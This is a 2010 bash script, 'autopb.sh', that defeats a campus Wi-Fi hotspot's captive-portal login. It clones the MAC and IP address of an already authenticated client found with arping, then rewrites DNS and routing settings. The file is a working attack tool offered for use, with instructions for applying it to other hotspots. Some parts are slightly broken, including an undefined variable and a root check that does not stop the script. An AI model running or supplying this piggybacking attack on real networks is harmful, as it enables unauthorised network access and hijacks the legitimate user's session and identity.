#!/bin/bash
#with this script you can connect without know portal password login on wireless(hotspot)
#usage : the first step we must be change to root authorty access (chmod +x autopb.sh),we will use scan-ip for detection host was connect, we will include ip target was connect on internet,input interface you want to change,ex : wlan0, wlan1,eth1,eth2, eth0, lo. Auto pgy backing are working automatic when we input ip target, you must be down,Your interface to use this program, this program automatic starting you interface.  
#--------- set color ---------#
white='\033[1;37m'
red='\033[0;31;1;31m'
yellow='\033[1;33m'
green='\033[0;32;1;32m'
blue='\033[1;34m'
default='\033[0m'
echo "autopb.sh"
echo "written by madexpert19 11 okt 2010"
echo "credits: [G]gunadarma[X]xmalang[R]research[G]group" 
echo "license: GPL (general public license)"
echo "copyleft (c) 2010"
echo "thanks to ALLAH SWT, aBi71 and Greatz to All GXRG CREW"
echo "blog : http://jetli@student[dot]gunadarma[dot]blogspot[dot]com, http://projects.gxrg.org"
echo "email : madexpert19@gmail.com"
echo "################################################################################
#       .______                .___                          ._______          #
#     __| _ __/ __________   __| _/ ___________   ______  _  |___   /          #
#    / __ |\  \/  /\_  __ \ / __ |_/ ___\_  __ \_/ __ \ \/ \/ / /  /           #
#   / /_/ |/  /\  \_|  | \// /_/ |\  \___|  | \/\  ___/\     / / _/___         #
#   \____ /__/  \__  >_|   \____ | \___  >__|    \___  >\/\_/ /_____  |        #
#   /--_| |        \/      /--_| |     \/            \/             \/         #
#   \____ |                \____ |         shell script                        #
#       \/                     \/        auto pgy backing                      #
# after use this script you will bypass portal login password hotspot campus   #
# you must used two tools : scan-ip and autopb for bypass login hotspot campus #
################################################################################"
echo "this program only used for backtrack4,backtrack4r1,for the other linux you must install arping"
echo "this script for bypass portal login hotspot campus"
echo "if you want to used for bypass the other hotspot,you can use dns or iproute hotspot target"
echo "for used this program you must be running as root"
echo "checking root access :"
A=`whoami`
if [ "$A" = "root" ];
then
echo "OK"
else
echo "this program running as root"
fi
#date 
/bin/date | /usr/bin/tee -a /tmp/log.log
echo "you must scan ip connect on innet with scan-ip or genlist before do auto piggy backing"
echo "you use the scan-ip which can be downloaded at http://projects.gxrg.org"
echo " "
echo "input your iptarget(ex: 192.168.108.4) :"
read -t 10 ip
echo " "
echo "input your interface(ex: wlan0,wlan1,eth0,eth1,eth2) :"
read -t 10 interface
#threading of auto-pgy-backing
ESSID=$(iwlist $interface scan | grep ESSID | iwgetid -r | awk '{print $1}')
echo $ESSID
ns=$(dig www.gunadarma.ac.id | grep ns1 | grep A | awk '{print $5}')
getmac=$(arping -f -c 1 -I $interface $ip | grep reply | awk '{print $5}' | sed 's/\[/ /g' | sed 's/\]/ /g');
echo $getmac
getip=$(arping -f -c 1 -I $interface $ip| grep reply | awk '{print $4}');
echo $getip
gw=$(route -ne | grep "$iface" | grep "UG" | awk '{print $2}');
#you must be down interface
#this command to piggy-backing
ifconfig $interface down
ifconfig $interface hw ether $getmac 
echo for interface newmac address  $interface : $getmac
ifconfig $interface $getip
echo for interface newip address $interface : $getip
ifconfig $interface up
echo "nameserver $ns" >/etc/resolv.conf
route add default gw $gw
iwconfig wlan0 essid $ESSID
ping $gw

